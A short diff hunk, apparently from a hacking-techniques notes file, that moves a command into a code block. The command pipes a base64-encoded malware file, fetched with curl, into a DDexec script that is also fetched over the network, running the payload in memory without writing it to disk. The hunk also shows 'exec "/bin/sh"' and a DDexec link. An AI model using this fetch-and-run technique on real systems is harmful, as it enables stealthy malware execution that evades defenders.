@@ -848,4 +848,7 @@ exec "/bin/sh";
 https://github.com/arget13/DDexec
 
 An amazing example provided by ippsec https://www.youtube.com/watch?v=MaBurwnrI4s
-`curl 127.0.0.1/malware.base64encoded | bash <(curl 127.0.0.1/ddexec.sh)`
+
+```
+curl 127.0.0.1/malware.base64encoded | bash <(curl 127.0.0.1/ddexec.sh)
+```
